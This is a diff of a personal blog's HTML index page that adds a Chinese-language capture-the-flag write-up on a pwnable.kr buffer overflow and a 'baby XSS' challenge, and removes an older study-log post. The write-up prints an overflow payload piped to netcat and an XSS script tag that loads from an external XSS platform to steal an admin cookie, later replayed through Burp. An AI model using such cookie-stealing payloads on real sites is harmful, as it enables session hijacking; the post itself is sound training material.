@@ -232,6 +232,153 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/04/pwn-bof-baby-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Conlonial">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Conlonial's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/04/pwn-bof-baby-xss/" itemprop="url">pwn-bof & baby xss</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-04T16:37:33+08:00">
+                2019-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><center> pwn-bof &amp; baby xss</center></p>
+<p><center> —– bof—–</center></p>
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li>详细解析ESP寄存器与EBP寄存器:<blockquote>
+<p><a href="https://blog.csdn.net/u011822516/article/details/20001765" target="_blank" rel="noopener">https://blog.csdn.net/u011822516/article/details/20001765</a></p>
+</blockquote>
+</li>
+<li>函数栈&amp;EIP、EBP、ESP寄存器的作用: ESP是栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。ESP始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。<br>EBP是基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。<font color="#D2691E">EBP存储着当前函数栈底的地址，栈低通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</font><blockquote>
+<p><a href="https://www.k2zone.cn/?p=1911" target="_blank" rel="noopener">https://www.k2zone.cn/?p=1911</a></p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>转到<a href="http://pwnable.kr/bin/bof" title="Download:" target="_blank" rel="noopener">Download</a> :<a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a> 下载bof文件，拖入IDA-32bits<br>F5编译后查看main函数，跟到func函数后，可知即将a1覆盖为<code>0xCAFEBABE</code> 即可。<br><img src="https://i.imgur.com/lT9knru.png" alt="Imgur"><br>s是ebp-2c,a1是ebp+8h,距离是(2c+8h=52)52，所以要覆盖52个字符.<br>再加上<code>0xCAFEBABE</code>，注意小端输入<br>所以输入<code>(python -c &quot;print &#39;a&#39;*52+&#39;\xbe\xba\xfe\xca&#39;&quot;;cat) | nc pwnable.kr 9000</code><br>ls得到flag文件<br><img src="https://i.imgur.com/q8P9Dgy.png" alt="Imgur"></p>
+<hr>
+<p><center>——babyxss—–</center></p>
+<h3 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li>基础知识<blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/37455061" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/37455061</a></p>
+</blockquote>
+</li>
+<li>MD5截断比较：<blockquote>
+<p><a href="https://www.cnblogs.com/kurokoleung/p/6363845.html" target="_blank" rel="noopener">https://www.cnblogs.com/kurokoleung/p/6363845.html</a><br><a href="http://blog.lnyas.xyz/?p=228" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=228</a></p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>这道题思路是通过XSS获取cookie，再通过burpsuit 抓包上传获得 flag，本身的xss没有任何r绕过，主要是一个md5截断作为验证码，根据参考的MD5截断程序编写babyxs.py，专门用作验证码获取。<br>这道题直接打开xss平台，选择默认模式，将平台生成的代码输入文本框，再输入验证码，就可以在平台得到cookie<br>我输入的代码如下：<code>&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=http://xssye.com/uc2M&gt;&lt;/sCrIpT&gt;</code><br>得到cookie：<img src="https://i.imgur.com/otR6cNk.png" alt="Imgur"><br>打开burpsuit，在intercept off 下打开 admin.php，再intercept on 进行抓包<br>得到<img src="https://i.imgur.com/TJ6C30N.png" alt="Imgur"><br>将cookie中<code>PHPSESSID=8062ffcea7f0e79ad37339918dc13fe8</code>改为我们得到的<code>token=a9011a0e551f181c1c526881befac44d</code><br>利用repeater发包后得到flag<br><img src="https://i.imgur.com/l3R8qj0.png" alt="Imgur"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/08/Rapid-Typing-fd-in-pwnable-col/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1391,125 +1538,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/17/20190417学习进度/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Conlonial">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Conlonial's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/17/20190417学习进度/" itemprop="url">20190417学习进度</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-17T18:03:52+08:00">
-                2019-04-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="第二章读完，主要了解了程序执行的步骤，从头文件被预编译到高级语言编译、高级语言转为机器语言的过程。"><a href="#第二章读完，主要了解了程序执行的步骤，从头文件被预编译到高级语言编译、高级语言转为机器语言的过程。" class="headerlink" title="第二章读完，主要了解了程序执行的步骤，从头文件被预编译到高级语言编译、高级语言转为机器语言的过程。"></a>第二章读完，主要了解了程序执行的步骤，从头文件被预编译到高级语言编译、高级语言转为机器语言的过程。</h1><h1 id="python学习到数据类型，简单随例程进行了编写"><a href="#python学习到数据类型，简单随例程进行了编写" class="headerlink" title="python学习到数据类型，简单随例程进行了编写"></a>python学习到数据类型，简单随例程进行了编写</h1>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1560,7 +1588,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
